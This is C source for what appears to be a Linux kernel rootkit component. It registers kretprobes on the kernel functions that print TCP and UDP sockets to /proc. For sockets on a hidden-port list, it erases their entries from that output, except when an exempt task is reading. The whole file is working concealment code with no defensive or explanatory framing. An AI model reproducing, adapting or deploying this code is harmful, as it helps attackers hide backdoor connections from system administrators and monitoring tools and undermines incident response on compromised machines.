#include "port_hider.h"

static bool rp_tcp4_ok;
static bool rp_tcp6_ok;
static bool rp_udp4_ok;
static bool rp_udp6_ok;

#define PROC_DATA_LEN (sizeof(void *) * 2 + sizeof(size_t))

struct proc_entry_data {
    void *v;
    struct seq_file *m;
    size_t saved_count;
};

/* fix seq_read on older kernels (5.10) where positive show() return
 * triggers break instead of SEQ_SKIP — erase entry by restoring m->count */
static int h_seq_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct proc_entry_data *d = (struct proc_entry_data *)ri->data;

    if (is_allowed_task()) {
        d->v = NULL;
        return 0;
    }

    d->v = (void *)regs->regs[1];
    if (!d->v || d->v == SEQ_START_TOKEN) {
        d->v = NULL;
        return 0;
    }

    struct sock *sk = (struct sock *)d->v;
    struct inet_sock *inet = inet_sk(sk);
    if (is_hidden_port(inet->inet_sport) ||
        is_hidden_port(inet->inet_dport)) {
        d->m = (struct seq_file *)regs->regs[0];
        d->saved_count = d->m->count;
    } else {
        d->v = NULL;
    }

    return 0;
}

static int h_seq_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct proc_entry_data *d = (struct proc_entry_data *)ri->data;

    if (d->v)
        d->m->count = d->saved_count;

    return 0;
}

/* TCP */

static struct kretprobe rp_tcp4 = {
    .entry_handler = h_seq_entry,
    .handler       = h_seq_ret,
    .data_size     = PROC_DATA_LEN,
    .maxactive     = 64,
    .kp.symbol_name = "tcp4_seq_show",
};

static struct kretprobe rp_tcp6 = {
    .entry_handler = h_seq_entry,
    .handler       = h_seq_ret,
    .data_size     = PROC_DATA_LEN,
    .maxactive     = 64,
    .kp.symbol_name = "tcp6_seq_show",
};

int setup_tcp_proc(void)
{
    if (register_kretprobe(&rp_tcp4) == 0)
        rp_tcp4_ok = true;
    if (register_kretprobe(&rp_tcp6) == 0)
        rp_tcp6_ok = true;
    return 0;
}

void cleanup_tcp_proc(void)
{
    if (rp_tcp4_ok) { unregister_kretprobe(&rp_tcp4); rp_tcp4_ok = false; }
    if (rp_tcp6_ok) { unregister_kretprobe(&rp_tcp6); rp_tcp6_ok = false; }
}

/* UDP */

static struct kretprobe rp_udp4 = {
    .entry_handler = h_seq_entry,
    .handler       = h_seq_ret,
    .data_size     = PROC_DATA_LEN,
    .maxactive     = 64,
    .kp.symbol_name = "udp4_seq_show",
};

static struct kretprobe rp_udp6 = {
    .entry_handler = h_seq_entry,
    .handler       = h_seq_ret,
    .data_size     = PROC_DATA_LEN,
    .maxactive     = 64,
    .kp.symbol_name = "udp6_seq_show",
};

int setup_udp_proc(void)
{
    if (register_kretprobe(&rp_udp4) == 0)
        rp_udp4_ok = true;
    if (register_kretprobe(&rp_udp6) == 0)
        rp_udp6_ok = true;
    return 0;
}

void cleanup_udp_proc(void)
{
    if (rp_udp4_ok) { unregister_kretprobe(&rp_udp4); rp_udp4_ok = false; }
    if (rp_udp6_ok) { unregister_kretprobe(&rp_udp6); rp_udp6_ok = false; }
}
